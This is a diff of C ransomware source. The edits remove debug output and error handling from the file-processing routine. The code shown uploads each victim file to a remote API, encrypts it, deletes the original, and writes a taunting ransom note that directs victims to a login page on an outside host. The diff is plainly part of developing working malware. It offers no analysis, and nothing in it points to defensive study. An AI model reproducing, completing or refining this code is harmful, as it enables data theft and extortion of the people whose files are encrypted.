@@ -244,7 +244,7 @@ void create_prank_file(const char *key) {
     fprintf(file, "We locked all your files, cuz of skills issues XDXDXDXDXDXD\nTo get your files back, follow this link and follow the instructions: http://willchabemyvalentine.love:42956/victim_login\nUse this to connect: %s\nGet rekd :3\nBest regards", key);
     fclose(file);
 
-    printf("File created at: %s\n", path);
+    //printf("File created at: %s\n", path);
 }
 
 char* get_user_path() {
@@ -270,12 +270,7 @@ char* get_user_path() {
 void handle_file(const char *path, const char *id, const char *URL, unsigned char *key, unsigned char *iv, unsigned char *aad) {
     sendFileToApi(path, id, URL);
     encrypt_file(key, iv, aad, path);
-    
-    if (remove(path) == 0) {
-        printf(":3\n");
-    } else {
-        perror("Error deleting file");
-    }
+    remove(path);
 }
 
 int should_ignore_file(const char *path, const char *ignoreDirs[], size_t num_ignoreDirs) {
